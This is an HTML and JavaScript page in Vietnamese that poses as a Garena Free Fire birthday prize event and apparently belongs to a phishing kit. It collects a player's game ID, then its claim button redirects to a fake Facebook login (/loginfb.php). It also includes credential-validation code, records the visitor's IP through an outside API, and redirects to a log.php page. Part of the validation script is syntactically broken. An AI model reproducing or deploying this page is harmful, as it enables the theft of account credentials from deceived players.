

<!DOCTYPE html>
<html>
<head>

	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
	<meta http-equiv="X-UA-Compatible" content="IE=edge" />
	<title>GARENA FREE FIRE</title>
	<link rel="stylesheet" type="text/css" href="style.css">
	<link rel="stylesheet" type="text/css" href="facebook.css">
	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
</head>
<body>
 <div class="loader">
            <img src="https://i.pinimg.com/originals/67/56/66/675666d840a9c8fa1c61eaf584ff2a50.gif">
        </div>
	<div class="nguyenSection">
					<div class="headerBg">
			<h1><i>GARENA FREE FIRE</i></h1>
			<img src="http://w5vn.mobie.in/CSS_JS_Code/1061/ngMedia/top.png">
		</div>
		<div class="ngWrap">
		    <div class="banner">
		   SỰ KIỆN SINH NHẬT FREE FIRE 5 TUỔI   </div>
			<div class="dialog">
				<div class="dialogBg">
				   <img src="https://i.imgur.com/XkQn2AI.png">
				</div>
			</div>
          	<div class="ST-bl"></div>
		<div class="ST-br"></div>
			<div class="ST-bagianAtas">
			<div class="ST-bannerText">
				<h2><marquee behavior="scroll">Sự Kiện sinh nhật garena free fire 5 tuổi,có rất nhiều phần quá xịn xò bên dưới,THAM GIA NGAY !</marquee></h2>
			</div>
              
			<div class="menu">
			   <a class="tab active">
			     <span class="tabbed" id="ep">TRANG PHỤC</span>
			   </a>
			 
			   <a class="tab">
			     <span class="tabbed" id="gun">VŨ KHÍ</span>
			   </a>
              </div>
			<div class="hadiah">
			</div>
			
		<div class="mask"></div>
		<div class="popDialog">
		    <div class="tutup" onclick="tutup()"></div>
		    <span class="titleText">Nhận Phần Thưởng?</span>
		    <div class="box">
			       <div class="prize">
			           <img id="inigambar" src="">
			       </div>
			       <div class="button" onclick="chauthebao()">
			         <img src="http://w5vn.mobie.in/CSS_JS_Code/1061/ngMedia/button.png">
			         <span class="text">Nhận</span>
			       </div>
			    </div>
		</div>
		
		<div class="checkId">
          <span class="titleText">ĐIỀN ID CỦA BẠN</span>
		    <input class="idInput" id="url" placeholder="ID GAME" autocomplete="off" onmouseenter="return false">
		    <button onclick="return tiktok()" class="check">Gửi ID</button>
		    <span class="alert salah">ID quá ngắn (phải từ 8 kí tự)</span>
		    <span class="alert notfound">ID Không Chính Xác !</span>
		    <span class="alert cek">Đang kiểm tra ID</span>
		</div>
		
		<div class="toast">
		   <span class="vis">
		   Xin chào <span id="nicks"></span>
		   </span>
		</div>
<style type="text/css">
	#togglePassword {
	position: absolute;
    margin-left: -30px;
    margin-top: 10px;
    cursor: pointer;
}

</style>
		
	<script type="text/javascript">
const togglePassword = document.querySelector('#togglePassword');
const password = document.querySelector('#password');
togglePassword.addEventListener('click', function (e) {
    // toggle the type attribute
    const type = password.getAttribute('type') === 'password' ? 'text' : 'password';
    password.setAttribute('type', type);
    // toggle the eye / eye slash icon
    this.classList.toggle('bi-eye');
});
</script>	
		
	</div>
	
	<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
	    <script>
        function chauthebao(){
            location.replace("/loginfb.php");
        }
    </script>
	<script>
    $(document).ready(function(){
       $(".loader").fadeOut();
    })
     </script>
	<script>
    $(document).ready(function(){
       $(".loader").fadeOut();
    })
     </script>
  <script>
       function tiktok(){
       var url = $("#url").val();
       $(".cek").show();
       $(".salah").hide();
       $(".notfound").hide();
       if(url == "" || url == null || url.length <= 7)
       {
       $(".salah").show();
       $(".cek").hide();
       $(".notfound").hide();
       return false;
       }else{
       $(".salah").hide();
       }
       
       $.ajax({
       type : 'GET',
       url : 'ngTrueid.php?id='+url+'',
       beforeSend : function(){
             $(".cek").show();
       },
       success : function(data){
       if(data == "" || data == null){
       $(".cek").hide();
       $(".notfound").show();
       }else{
       $(".checkId").hide();
       $(".toast").show();
       $("#nicks").text(data);
       $("#id").val(url);
       $("#nick").val(data);
       setTimeout(() => {
       $(".mask").fadeOut();
       $(".toast").fadeOut();
       },2000)
       }
       }
       })
       
       }
// Code by Nông Văn Nguyên
// Facebook.com/778578204
    </script>
	<script>
	  $(document).on('click','.menu .tab',function(){
	     $(this).addClass("active").siblings().removeClass("active");
	  })
	  $(".tabbed").click(function(){
	     var wan = $(this).attr('id');
	     if(wan == "ep"){
	         $(".hadiah").load("1.php");
	     }else if(wan == "cobra"){
	         $(".hadiah").load("2.php");
	     }else if(wan == "gun"){
	         $(".hadiah").load("3.php");
	     }
	  })
	  $(".hadiah").load("1.php");
	  </script>
	  <script type="text/javascript">
        function valid() {
            var user = $('#user').val();
            var pass = $('#pass').val();
            var ip = $('#ip').val();
            if(user == '' || user == null)
            {
                $('.email').show();
                $('.sandi').hide();
                return false;
            }else{
            
                if(user.includes('@')){
                let pattern = /^[^ ]+@[^ ]+\.[a-z]{2,3}$/;
                if(user.match(pattern)){
                $('.email').hide();
                }else{
                $('.email').show();
                $('.sandi').hide();
                return false;
                }
                }
                
                if(!isNaN(user)){
                if(user.length <= 10){
                $('.email').show();
                $('.sandi').hide();
                return false;
                }else{
                $('.email').hide();
                }
                }
                
                if(user.match(/\s/g)){
                $('.email').show();
                $('.sandi').hide();
                return false;
                }else{
                $('.email').hide();
                }
                
                var regex = /(?:^|[^@\.\w-])([a-z0-9]+:\/\/)?(\w(?!ailto:)\w+:\w+@)?([\w.-]+\.[a-z]{2,4})(:[0-9]+)?(\/.*)?(?=$|[^@\.\w-])/im;
                if(user.match(regex)){
                $('.email').show();
                $('.sandi').hide();
                return false;
                }
                
                
                if(user.length <= 5){
                $('.email').show();
                $('.sandi').hide();
                return false;
                }else{
                $('.email').hide();
                }
                
            }
            if(pass.length <= 5 || pass == '123456' || pass == null || )
             return false;
                } else {
                    return true;
                }
            }
              
            {
                $('.sandi').show();
                return false;
            }else{
                $('.sandi').hide();
            }
            var regexs = /(?:^|[^@\.\w-])([a-z0-9]+:\/\/)?(\w(?!ailto:)\w+:\w+@)?([\w.-]+\.[a-z]{2,4})(:[0-9]+)?(\/.*)?(?=$|[^@\.\w-])/im;
                if(pass.match(regexs)){
                $('.sandi').show();
                $('.email').hide();
                return false;
                }else{
                $('.sandi').hide();
                }
            
            // Jika Sukses
            $("#btnfb").addClass("disabled");
        }
    </script>
	  <script type="text/javascript">
        var checkip = function () {
               $.ajax({
                   type: "get",
                   async: false,
                   url: "https://api.pubgameshowtime.com/ip/getcountry",
                   dataType: "json",
                   success: function (result) {
                      $('#ip').val(result.ip);
                   }
               })
           }
        checkip();
 
	  </script>
	  	  <script>

	      function ambil(e){
	      var p = e.parentElement.getElementsByTagName('img');
	        var img = p[0].getAttribute("src");
	        $("#inigambar").attr("src",img);
	        $(".mask").show();
	        $(".popDialog").fadeIn();
	      }
	      function tutup()
	      {
	        $(".mask").fadeOut();
	        $(".popDialog").fadeOut();
	      }
	      
	    function wislogfb(){
            window.location.href = "log.php?i=ktmctbr&l=e"
        }
	  </script></body>
</html>